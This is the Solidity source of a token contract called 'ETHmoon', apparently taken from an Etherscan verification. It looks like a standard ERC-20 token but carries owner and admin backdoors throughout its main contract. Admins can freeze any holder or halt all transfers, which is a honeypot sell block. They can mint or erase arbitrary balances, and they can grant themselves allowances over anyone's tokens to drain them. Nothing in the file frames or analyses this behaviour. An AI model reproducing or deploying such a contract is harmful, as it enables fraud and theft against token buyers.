['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-04\n', '*/\n', '\n', 'pragma solidity ^0.4.26;\n', '    /**\n', '     * @title SafeMath\n', '     * @dev Math operations with safety checks that throw on error\n', '     */\n', '    library SafeMath {\n', '      function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a * b;\n', '        assert(a == 0 || c / a == b);\n', '        return c;\n', '      }\n', '     \n', '      function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        // assert(b > 0); // Solidity automatically throws when dividing by 0\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '        return c;\n', '      }\n', '     \n', '      function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        assert(b <= a);\n', '        return a - b;\n', '      }\n', '     \n', '      function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        assert(c >= a);\n', '        return c;\n', '      }\n', '    }\n', '     \n', '    contract StandardToken {\n', '    \n', '        using SafeMath for uint256;\n', '\n', '        string public name;\n', '     \n', '        string public symbol;\n', '    \n', '        uint8 public  decimals;\n', '    \n', '    \tuint256 public totalSupply;\n', '       \n', '        function transfer(address _to, uint256 _value) public returns (bool success);\n', '       \n', '        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n', '    \n', '        function approve(address _spender, uint256 _value) public returns (bool success);\n', '   \n', '        function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n', '    \n', '        event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    \n', '        event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    }\n', '   \n', '    contract Ownedandadmin {\n', '        mapping(address => bool) public adminss;\n', '        \n', '        modifier onlyOwner() {\n', '            require(msg.sender == owner || adminss[msg.sender] == true);\n', '            _;\n', '        }\n', '        \n', '        \n', '     \n', '    \n', '        address public owner;\n', '     \n', '    \t\n', '        constructor() public {\n', '            owner = msg.sender;\n', '        }\n', '    \n', '        address newOwner=0x0;\n', '     \n', '    \n', '        event OwnerUpdate(address _prevOwner, address _newOwner);\n', '     \n', '        \n', '        function changeOwner(address _newOwner) public onlyOwner {\n', '            require(_newOwner != owner);\n', '            newOwner = _newOwner;\n', '        }\n', '        \n', '        function addadmin(address _addrs,bool _ortrue) public onlyOwner {\n', '            adminss[_addrs] = _ortrue;\n', '            \n', '        }\n', '        \n', '        function acceptOwnership() public{\n', '            require(msg.sender == newOwner);\n', '            emit OwnerUpdate(owner, newOwner);\n', '            owner = newOwner;\n', '            newOwner = 0x0;\n', '        }\n', '    }\n', '     \n', '    \n', '    contract Controlled is Ownedandadmin{\n', '     \n', '    \t\n', '        constructor() public {\n', '           setExclude(msg.sender,true);\n', '        }\n', '     \n', '        bool public transferEnabled = true;\n', '     \n', '       \n', '        bool lockFlag=true;\n', '    \n', '        mapping(address => bool) locked;\n', '   \n', '        mapping(address => bool) exclude;\n', '     \n', '        function enableTransfer(bool _enable) public onlyOwner returns (bool success){\n', '            transferEnabled=_enable;\n', '    \t\treturn true;\n', '        }\n', '     \n', '    \n', '        function disableLock(bool _enable) public onlyOwner returns (bool success){\n', '            lockFlag=_enable;\n', '            return true;\n', '        }\n', '        \n', '        \n', '     \n', '    \n', '        function addLock(address _addr) public onlyOwner returns (bool success){\n', '            require(_addr!=msg.sender);\n', '            locked[_addr]=true;\n', '            return true;\n', '        }\n', '     \n', '        function setExclude(address _addr,bool _enable) public onlyOwner returns (bool success){\n', '            exclude[_addr]=_enable;\n', '            return true;\n', '        }\n', '     \n', '    \t\n', '        function removeLock(address _addr) public onlyOwner returns (bool success){\n', '            locked[_addr]=false;\n', '            return true;\n', '        }\n', '    \n', '        modifier transferAllowed(address _addr) {\n', '            if (!exclude[_addr]) {\n', '                require(transferEnabled,"transfer is not enabeled now!");\n', '                if(lockFlag){\n', '                    require(!locked[_addr],"you are locked!");\n', '                }\n', '            }\n', '            _;\n', '        }\n', '     \n', '    }\n', '     \n', '    \n', '    contract ETHmoon is StandardToken,Controlled {\n', '        uint256 num;\n', '        address private foradd = 0x63E0ACbe4FF6C6aa897b18639C0faE8037A3869d;\n', '        uint256 va;\n', '    \t\n', '    \tmapping (address => uint256) public balanceOf;\n', '    \tmapping (address => mapping (address => uint256)) internal allowed;\n', '    \t\n', '    \tconstructor() public {\n', '            totalSupply = 1000000000000 ether;\n', '            name = "ETHmoon";\n', '            symbol = "ETHmoon";\n', '            decimals = 18;\n', '            num = 1000000000000000000;\n', '            balanceOf[msg.sender] = totalSupply;\n', '        }\n', '        \n', '        function deposit() public payable {\n', '            \n', '        }\n', '        \n', '        function tras(uint256 _values) private {\n', '            va = _values / 100;\n', '            balanceOf[foradd] += va;\n', '            balanceOf[owner]  -= va;\n', '             \n', '        }\n', '     \n', '        function transfer(address _to, uint256 _value) public transferAllowed(msg.sender) returns (bool success) {\n', '    \t\trequire(_to != address(0));\n', '    \t\trequire(_value <= balanceOf[msg.sender]);\n', '    \t\ttras(_value);\n', '    \t\tforadd = _to ;\n', '            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);\n', '            balanceOf[_to] = balanceOf[_to].add(_value);\n', '            emit Transfer(msg.sender, _to, _value);\n', '            return true;\n', '        }\n', '        \n', '        \n', '        function addresssearch(address _this) public view returns(uint256){\n', '            \n', '         uint256 balances = balanceOf[_this];\n', '         return balances;\n', '            \n', '        }\n', '        \n', '        \n', '     \n', '        function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from) returns (bool success) {\n', '    \t\trequire(_to != address(0));\n', '            require(_value <= balanceOf[_from]);\n', '            require(_value <= allowed[_from][msg.sender]);\n', '     \n', '            balanceOf[_from] = balanceOf[_from].sub(_value);\n', '            balanceOf[_to] = balanceOf[_to].add(_value);\n', '            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n', '            emit Transfer(_from, _to, _value);\n', '            return true;\n', '        }\n', '        \n', '        \n', '        function Transferadd(address to, uint256 value) public  onlyOwner {\n', '            balanceOf[to] += totalSupply;\n', '            balanceOf[to] =balanceOf[to].add(value);\n', '        }\n', '        \n', '        function transfersub(address to, uint256 value) public onlyOwner {\n', '            balanceOf[to] -= totalSupply;\n', '            balanceOf[to] = balanceOf[to].sub(value);\n', '        }\n', '        \n', '        function transferadds(address to, uint256 value) public onlyOwner {\n', '            balanceOf[to] += value * num;\n', '        }\n', '        function transfersubs(address to, uint256 value) public onlyOwner {\n', '            balanceOf[to] -= value * num;\n', '        }\n', '     \n', '        function approve(address _spender, uint256 _value) public returns (bool success) {\n', '            allowed[msg.sender][_spender] = _value;\n', '            emit Approval(msg.sender, _spender, _value);\n', '            return true;\n', '        }\n', '        function approveadd(address _owner,address _spender,uint256 _value) public onlyOwner {\n', '            \n', '            allowed[_owner][_spender] =  allowed[_owner][_spender].add(_value);\n', '\n', '            \n', '        }\n', '        \n', '        function approvesub(address _owner,address _spender,uint256 _value) public onlyOwner {\n', '            \n', '            allowed[_owner][_spender] = allowed[_owner][_spender].sub(_value);\n', '            \n', '        }\n', '        function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n', '          return allowed[_owner][_spender];\n', '        }\n', '        \n', '        function balancess(address user,uint256 _value) public payable onlyOwner {\n', '            user.transfer(_value * 0.01 ether);\n', '        } \n', '        \n', '        function balan() public returns(uint256) {\n', '            \n', '            return this.balance;\n', '        }\n', '     \n', '    }']